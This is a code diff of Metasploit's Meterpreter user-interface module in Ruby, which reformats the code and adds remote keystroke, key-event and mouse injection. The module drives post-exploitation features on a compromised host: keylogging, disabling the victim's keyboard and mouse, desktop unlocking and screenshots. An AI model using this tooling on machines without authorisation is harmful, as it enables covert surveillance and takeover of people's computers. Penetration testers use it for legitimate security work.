@@ -1,4 +1,3 @@
-#!/usr/bin/env ruby
 # -*- coding: binary -*-
 
 require 'rex/post/ui'
@@ -22,238 +21,295 @@ module Stdapi
 ###
 class UI < Rex::Post::UI
 
-	include Rex::Post::Meterpreter::ObjectAliasesContainer
+  include Rex::Post::Meterpreter::ObjectAliasesContainer
 
-	##
-	#
-	# Constructor
-	#
-	##
+  ##
+  #
+  # Constructor
+  #
+  ##
 
-	#
-	# Initializes the post-exploitation user-interface manipulation subsystem.
-	#
-	def initialize(client)
-		self.client = client
-	end
+  #
+  # Initializes the post-exploitation user-interface manipulation subsystem.
+  #
+  def initialize(client)
+    self.client = client
+  end
 
-	##
-	#
-	# Device enabling/disabling
-	#
-	##
+  ##
+  #
+  # Device enabling/disabling
+  #
+  ##
 
-	#
-	# Disable keyboard input on the remote machine.
-	#
-	def disable_keyboard
-		return enable_keyboard(false)
-	end
+  #
+  # Disable keyboard input on the remote machine.
+  #
+  def disable_keyboard
+    return enable_keyboard(false)
+  end
 
-	#
-	# Enable keyboard input on the remote machine.
-	#
-	def enable_keyboard(enable = true)
-		request = Packet.create_request('stdapi_ui_enable_keyboard')
+  #
+  # Enable keyboard input on the remote machine.
+  #
+  def enable_keyboard(enable = true)
+    request = Packet.create_request(COMMAND_ID_STDAPI_UI_ENABLE_KEYBOARD)
 
-		request.add_tlv(TLV_TYPE_BOOL, enable)
+    request.add_tlv(TLV_TYPE_BOOL, enable)
 
-		response = client.send_request(request)
+    client.send_request(request)
 
-		return true
-	end
+    return true
+  end
 
-	#
-	# Disable mouse input on the remote machine.
-	#
-	def disable_mouse
-		return enable_mouse(false)
-	end
+  #
+  # Disable mouse input on the remote machine.
+  #
+  def disable_mouse
+    return enable_mouse(false)
+  end
 
-	#
-	# Enable mouse input on the remote machine.
-	#
-	def enable_mouse(enable = true)
-		request = Packet.create_request('stdapi_ui_enable_mouse')
+  #
+  # Enable mouse input on the remote machine.
+  #
+  def enable_mouse(enable = true)
+    request = Packet.create_request(COMMAND_ID_STDAPI_UI_ENABLE_MOUSE)
 
-		request.add_tlv(TLV_TYPE_BOOL, enable)
+    request.add_tlv(TLV_TYPE_BOOL, enable)
 
-		response = client.send_request(request)
+    client.send_request(request)
 
-		return true
-	end
+    return true
+  end
 
-	#
-	# Returns the number of seconds the remote machine has been idle
-	# from user input.
-	#
-	def idle_time
-		request = Packet.create_request('stdapi_ui_get_idle_time')
+  #
+  # Returns the number of seconds the remote machine has been idle
+  # from user input.
+  #
+  def idle_time
+    request = Packet.create_request(COMMAND_ID_STDAPI_UI_GET_IDLE_TIME)
 
-		response = client.send_request(request)
+    response = client.send_request(request)
 
-		return response.get_tlv_value(TLV_TYPE_IDLE_TIME);
-	end
+    return response.get_tlv_value(TLV_TYPE_IDLE_TIME);
+  end
 
-	#
-	# Enumerate desktops.
-	#
-	def enum_desktops
-		request  = Packet.create_request('stdapi_ui_desktop_enum')
-		response = client.send_request(request)
-		desktopz = []
-		if( response.result == 0 )
-			response.each( TLV_TYPE_DESKTOP ) { | desktop |
-			desktopz << {
-					'session' => desktop.get_tlv_value( TLV_TYPE_DESKTOP_SESSION ),
-					'station' => desktop.get_tlv_value( TLV_TYPE_DESKTOP_STATION ),
-					'name'    => desktop.get_tlv_value( TLV_TYPE_DESKTOP_NAME )
-				}
-			}
-		end
-		return desktopz
-	end
+  #
+  # Enumerate desktops.
+  #
+  def enum_desktops
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_DESKTOP_ENUM)
+    response = client.send_request(request)
+    desktopz = []
+    if( response.result == 0 )
+      response.each( TLV_TYPE_DESKTOP ) { | desktop |
+      desktopz << {
+          'session' => desktop.get_tlv_value( TLV_TYPE_DESKTOP_SESSION ),
+          'station' => desktop.get_tlv_value( TLV_TYPE_DESKTOP_STATION ),
+          'name'    => desktop.get_tlv_value( TLV_TYPE_DESKTOP_NAME )
+        }
+      }
+    end
+    return desktopz
+  end
 
-	#
-	# Get the current desktop meterpreter is using.
-	#
-	def get_desktop
-		request  = Packet.create_request( 'stdapi_ui_desktop_get' )
-		response = client.send_request( request )
-		desktop  = {}
-		if( response.result == 0 )
-			desktop = {
-					'session' => response.get_tlv_value( TLV_TYPE_DESKTOP_SESSION ),
-					'station' => response.get_tlv_value( TLV_TYPE_DESKTOP_STATION ),
-					'name'    => response.get_tlv_value( TLV_TYPE_DESKTOP_NAME )
-				}
-		end
-		return desktop
-	end
+  #
+  # Get the current desktop meterpreter is using.
+  #
+  def get_desktop
+    request  = Packet.create_request( COMMAND_ID_STDAPI_UI_DESKTOP_GET )
+    response = client.send_request( request )
+    desktop  = {}
+    if( response.result == 0 )
+      desktop = {
+          'session' => response.get_tlv_value( TLV_TYPE_DESKTOP_SESSION ),
+          'station' => response.get_tlv_value( TLV_TYPE_DESKTOP_STATION ),
+          'name'    => response.get_tlv_value( TLV_TYPE_DESKTOP_NAME )
+        }
+    end
+    return desktop
+  end
 
-	#
-	# Change the meterpreters current desktop. The switch param sets this
-	# new desktop as the interactive one (The local users visible desktop
-	# with screen/keyboard/mouse control).
-	#
-	def set_desktop( session=-1, station='WinSta0', name='Default', switch=false )
-		request  = Packet.create_request( 'stdapi_ui_desktop_set' )
-		request.add_tlv( TLV_TYPE_DESKTOP_SESSION, session )
-		request.add_tlv( TLV_TYPE_DESKTOP_STATION, station )
-		request.add_tlv( TLV_TYPE_DESKTOP_NAME, name )
-		request.add_tlv( TLV_TYPE_DESKTOP_SWITCH, switch )
-		response = client.send_request( request )
-		if( response.result == 0 )
-			return true
-		end
-		return false
-	end
+  #
+  # Change the meterpreters current desktop. The switch param sets this
+  # new desktop as the interactive one (The local users visible desktop
+  # with screen/keyboard/mouse control).
+  #
+  def set_desktop( session=-1, station='WinSta0', name='Default', switch=false )
+    request  = Packet.create_request( COMMAND_ID_STDAPI_UI_DESKTOP_SET )
+    request.add_tlv( TLV_TYPE_DESKTOP_SESSION, session )
+    request.add_tlv( TLV_TYPE_DESKTOP_STATION, station )
+    request.add_tlv( TLV_TYPE_DESKTOP_NAME, name )
+    request.add_tlv( TLV_TYPE_DESKTOP_SWITCH, switch )
+    response = client.send_request( request )
+    if( response.result == 0 )
+      return true
+    end
+    return false
+  end
 
-	#
-	# Grab a screenshot of the interactive desktop
-	#
-	def screenshot( quality=50 )
-		request = Packet.create_request( 'stdapi_ui_desktop_screenshot' )
-		request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY, quality )
-		# include the x64 screenshot dll if the host OS is x64
-		if( client.sys.config.sysinfo['Architecture'] =~ /^\S*x64\S*/ )
-			screenshot_path = ::File.join( Msf::Config.install_root, 'data', 'meterpreter', 'screenshot.x64.dll' )
-			screenshot_path = ::File.expand_path( screenshot_path )
-			screenshot_dll  = ''
-			::File.open( screenshot_path, 'rb' ) do |f|
-				screenshot_dll += f.read( f.stat.size )
-			end
-			request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER, screenshot_dll, false, true )
-			request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH, screenshot_dll.length )
-		end
-		# but allways include the x86 screenshot dll as we can use it for wow64 processes if we are on x64
-		screenshot_path = ::File.join( Msf::Config.install_root, 'data', 'meterpreter', 'screenshot.dll' )
-		screenshot_path = ::File.expand_path( screenshot_path )
-		screenshot_dll  = ''
-		::File.open( screenshot_path, 'rb' ) do |f|
-			screenshot_dll += f.read( f.stat.size )
-		end
-		request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER, screenshot_dll, false, true )
-		request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH, screenshot_dll.length )
-		# send the request and return the jpeg image if successfull.
-		response = client.send_request( request )
-		if( response.result == 0 )
-			return response.get_tlv_value( TLV_TYPE_DESKTOP_SCREENSHOT )
-		end
-		return nil
-	end
+  #
+  # Grab a screenshot of the interactive desktop
+  #
+  def screenshot( quality=50 )
+    request = Packet.create_request( COMMAND_ID_STDAPI_UI_DESKTOP_SCREENSHOT )
+    request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY, quality )
 
-	#
-	# Unlock or lock the desktop
-	#
-	def unlock_desktop(unlock=true)
-		request  = Packet.create_request('stdapi_ui_unlock_desktop')
-		request.add_tlv(TLV_TYPE_BOOL, unlock)
-		response = client.send_request(request)
-		return true
-	end
+    if client.base_platform == 'windows'
+      # Check if the target is running Windows 8/Windows Server 2012 or later and there are session 0 desktops visible.
+      # Session 0 desktops should only be visible to services. Windows 8/Server 2012 and later introduce the restricted
+      # desktop for services, which means that services cannot view the normal user's desktop or otherwise interact with
+      # it in any way. Attempting to take a screenshot from a service on these systems can lead to non-desireable
+      # behavior, such as explorer.exe crashing, which will force the compromised user to log back into their system
+      # again. For these reasons, any attempt to perform screenshots under these circumstances will be met with an error message.
+      opSys = client.sys.config.sysinfo['OS']
+      build = opSys.match(/Build (\d+)/)
+      if build.nil?
+        raise RuntimeError, 'Could not determine Windows build number to determine if taking a screenshot is safe.', caller
+      else
+        build_number = build[1].to_i
+        if build_number >= 9200 # Windows 8/Windows Server 2012 and later
+          current_desktops = enum_desktops
+          current_desktops.each do |desktop|
+            if desktop["session"].to_s == '0'
+              raise RuntimeError, 'Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.', caller
+            end
+          end
+        end
+      end
 
-	#
-	# Start the keyboard sniffer
-	#
-	def keyscan_start
-		request  = Packet.create_request('stdapi_ui_start_keyscan')
-		response = client.send_request(request)
-		return true
-	end
+      # include the x64 screenshot dll if the host OS is x64
+      if( client.sys.config.sysinfo['Architecture'] =~ /^\S*x64\S*/ )
+        screenshot_path = MetasploitPayloads.meterpreter_path('screenshot','x64.dll')
+        if screenshot_path.nil?
+          raise RuntimeError, "screenshot.x64.dll not found", caller
+        end
 
-	#
-	# Stop the keyboard sniffer
-	#
-	def keyscan_stop
-		request  = Packet.create_request('stdapi_ui_stop_keyscan')
-		response = client.send_request(request)
-		return true
-	end
+        screenshot_dll  = ''
+        ::File.open( screenshot_path, 'rb' ) do |f|
+          screenshot_dll += f.read( f.stat.size )
+        end
 
-	#
-	# Dump the keystroke buffer
-	#
-	def keyscan_dump
-		request  = Packet.create_request('stdapi_ui_get_keys')
-		response = client.send_request(request)
-		return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
-	end
+        request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER, screenshot_dll, false, true )
+      end
 
-	#
-	# Extract the keystroke from the buffer data
-	#
-	def keyscan_extract(buffer_data)
-		outp = ""
-		buffer_data.unpack("n*").each do |inp|
-			fl = (inp & 0xff00) >> 8
-			vk = (inp & 0xff)
-			kc = VirtualKeyCodes[vk]
+      # but always include the x86 screenshot dll as we can use it for wow64 processes if we are on x64
+      screenshot_path = MetasploitPayloads.meterpreter_path('screenshot','x86.dll')
+      if screenshot_path.nil?
+        raise RuntimeError, "screenshot.x86.dll not found", caller
+      end
 
-			f_shift = fl & (1<<1)
-			f_ctrl  = fl & (1<<2)
-			f_alt   = fl & (1<<3)
+      screenshot_dll  = ''
+      ::File.open( screenshot_path, 'rb' ) do |f|
+        screenshot_dll += f.read( f.stat.size )
+      end
 
-			if(kc)
-				name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
-				case name
-				when /^.$/
-					outp << name
-				when /shift|click/i
-				when 'Space'
-					outp << " "
-				else
-					outp << " <#{name}> "
-				end
-			else
-				outp << " <0x%.2x> " % vk
-			end
-		end
-		return outp
-	end
+      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER, screenshot_dll, false, true )
+    end
+
+    # send the request and return the jpeg image if successfull.
+    response = client.send_request( request )
+    if( response.result == 0 )
+      return response.get_tlv_value( TLV_TYPE_DESKTOP_SCREENSHOT )
+    end
+
+    return nil
+  end
+
+  #
+  # Unlock or lock the desktop
+  #
+  def unlock_desktop(unlock=true)
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_UNLOCK_DESKTOP)
+    request.add_tlv(TLV_TYPE_BOOL, unlock)
+    client.send_request(request)
+    return true
+  end
+
+  #
+  # Start the keyboard sniffer
+  #
+  def keyscan_start(trackwindow=false)
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_START_KEYSCAN)
+    request.add_tlv( TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW, trackwindow )
+    client.send_request(request)
+    return true
+  end
+
+  #
+  # Stop the keyboard sniffer
+  #
+  def keyscan_stop
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_STOP_KEYSCAN)
+    client.send_request(request)
+    return true
+  end
+
+  #
+  # Dump the keystroke buffer
+  #
+  def keyscan_dump
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_GET_KEYS_UTF8)
+    response = client.send_request(request)
+    return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
+  end
+
+  #
+  # Send keystrokes
+  #
+  def keyboard_send(keys)
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_SEND_KEYS)
+    request.add_tlv( TLV_TYPE_KEYS_SEND, keys )
+    client.send_request(request)
+    return true
+  end
+
+  #
+  # Send key events
+  #
+  def keyevent_send(key_code, action = 0)
+    key_data = [ action, key_code ].pack("VV")
+    request = Packet.create_request(COMMAND_ID_STDAPI_UI_SEND_KEYEVENT)
+    request.add_tlv( TLV_TYPE_KEYEVENT_SEND, key_data )
+    client.send_request(request)
+    return true
+  end
+
+  #
+  # Mouse input
+  #
+  def mouse(mouseaction, x=-1, y=-1)
+    request  = Packet.create_request(COMMAND_ID_STDAPI_UI_SEND_MOUSE)
+    action = 0
+    case mouseaction
+    when "move"
+      action = 0
+    when "click", "tap", "leftclick"
+      action = 1
+    when "down", "leftdown"
+      action = 2
+    when "up", "leftup"
+      action = 3
+    when "rightclick"
+      action = 4
+    when "rightdown"
+      action = 5
+    when "rightup"
+      action = 6
+    when "doubleclick"
+      action = 7
+    else
+      action = mouseaction.to_i
+    end
+    request.add_tlv( TLV_TYPE_MOUSE_ACTION, action )
+    request.add_tlv( TLV_TYPE_MOUSE_X, x.to_i )
+    request.add_tlv( TLV_TYPE_MOUSE_Y, y.to_i )
+    client.send_request(request)
+    return true
+  end
 
 protected
-	attr_accessor :client # :nodoc:
+  attr_accessor :client # :nodoc:
 
 end
 
